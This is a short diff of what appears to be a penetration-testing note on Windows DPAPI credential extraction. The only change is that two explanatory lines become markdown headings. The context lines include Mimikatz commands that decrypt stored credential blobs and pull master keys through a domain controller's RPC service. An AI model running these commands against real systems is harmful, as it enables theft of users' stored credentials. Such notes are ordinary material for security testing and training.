@@ -36,7 +36,7 @@ Prevent LSASS from checking the credential type
 
         dpapi::cred /in"%appdata%\Microsoft\Credentials\85HJK6B5J456KJ46KJ546435H3JK"
 
-If dwFlags includes CRYPTPROTECT_SYSTEM, the blob is protected by the system and cannot be decrypted by a standard user. The guidMasterKey indicates the necessary master key for decryption.
+#### If dwFlags includes CRYPTPROTECT_SYSTEM, the blob is protected by the system and cannot be decrypted by a standard user. The guidMasterKey indicates the necessary master key for decryption.
 
 Extract the master key
 
@@ -44,7 +44,7 @@ Extract the master key
 
 BONUS: RPC for Domain Controllers
 
-Domain controllers can decrypt master keys for authorized users using the RPC service.
+#### Domain controllers can decrypt master keys for authorized users using the RPC service.
 
         dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-341242153252-423423531651-2536513646524-1104\cc354534jkb534jb5-09f8-dd24-fe8fr798fed" /rpc
 
